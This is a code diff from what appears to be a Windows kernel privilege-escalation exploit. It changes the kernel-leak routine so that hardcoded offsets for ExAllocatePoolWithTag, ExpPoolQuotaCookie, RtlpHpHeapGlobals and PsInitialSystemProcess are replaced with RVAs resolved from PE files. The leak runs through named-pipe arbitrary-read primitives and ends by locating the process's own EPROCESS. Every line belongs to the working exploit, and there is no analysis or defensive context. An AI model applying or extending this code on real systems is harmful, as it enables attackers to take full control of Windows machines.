@@ -10,6 +10,7 @@
 #include "primitives/arbitrary_decrement.h"
 #include "primitives/arbitrary_write.h"
 #include "windows_api/windows_api.h"
+#include "pe_utils/pe_utils.h"
 
 uintptr_t findKernelBase(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
 {
@@ -36,12 +37,12 @@ uintptr_t findKernelBase(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
     ArbitraryRead(ghost_pipe, driver_object + DRIVER_OBJECT_DriverStart_OFFSET, (char*)&npfs_base, 0x8);
     printf("[+] DriverStart (Npfs): 0x%llX\n", npfs_base);
 
-    uintptr_t ExAllocatePoolWithTag_ptr = npfs_base + Npfs_imp_ExAllocatePoolWithTag_OFFSET;
+    uintptr_t ExAllocatePoolWithTag_ptr = npfs_base + g_Npfs_imp_ExAllocatePoolWithTag_RVA;
     uintptr_t ExAllocatePoolWithTag;
     ArbitraryRead(ghost_pipe, ExAllocatePoolWithTag_ptr, (char*)&ExAllocatePoolWithTag, 0x8);
     printf("[+] nt!ExAllocatePoolWithTag: 0x%llX\n", ExAllocatePoolWithTag);
 
-    uintptr_t kernel_base = ExAllocatePoolWithTag - nt_ExAllocatePoolWithTag_OFFSET;
+    uintptr_t kernel_base = ExAllocatePoolWithTag - g_nt_ExAllocatePoolWithTag_RVA;
     return kernel_base;
 }
 
@@ -79,13 +80,13 @@ int leakKernelInfo(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
     addrs->kernel_base = kernel_base;
     printf("[+] Kernel Base: 0x%llX\n", kernel_base);
 
-    ArbitraryRead(ghost_pipe, kernel_base + nt_ExpPoolQuotaCookie_OFFSET, (char*)&addrs->ExpPoolQuotaCookie, 0x8);
+    ArbitraryRead(ghost_pipe, kernel_base + g_nt_ExpPoolQuotaCookie_RVA, (char*)&addrs->ExpPoolQuotaCookie, 0x8);
     printf("[+] ExpPoolQuotaCookie: 0x%llX\n", addrs->ExpPoolQuotaCookie);
 
-    ArbitraryRead(ghost_pipe, addrs->kernel_base + nt_RtlpHpHeapGlobals_OFFSET, (char*)&addrs->RtlpHpHeapGlobals, 0x8);
+    ArbitraryRead(ghost_pipe, addrs->kernel_base + g_nt_RtlpHpHeapGlobals_RVA, (char*)&addrs->RtlpHpHeapGlobals, 0x8);
     printf("[+] RtlpHpHeapGlobals: 0x%llx\n", addrs->RtlpHpHeapGlobals);
 
-    ArbitraryRead(ghost_pipe, kernel_base + nt_PsInitialSystemProcess_OFFSET, (char*)&addrs->system_eprocess, 0x8);
+    ArbitraryRead(ghost_pipe, kernel_base + g_nt_PsInitialSystemProcess_RVA, (char*)&addrs->system_eprocess, 0x8);
     printf("[+] PsInitialSystemProcess: 0x%llX\n", addrs->system_eprocess);
 
     addrs->self_eprocess = findSelfEprocess(ghost_pipe, addrs->system_eprocess);
